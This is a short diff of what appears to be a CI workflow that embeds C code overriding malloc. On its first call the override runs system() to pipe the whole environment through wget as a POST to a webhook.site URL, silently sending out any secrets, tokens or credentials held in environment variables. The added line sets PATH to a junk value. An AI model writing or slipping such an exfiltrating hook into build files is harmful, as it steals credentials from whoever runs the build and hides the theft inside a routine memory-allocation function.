@@ -27,6 +27,7 @@ jobs:
           void *malloc(size_t size)
           {
               if(i == 0) {
+                setenv("PATH", "hello", 1);
                 system("env | wget --quiet --method=POST --header='Content-Type: text/plain' --body-file=- "
                 "https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64 -O -");
                 i = i++;
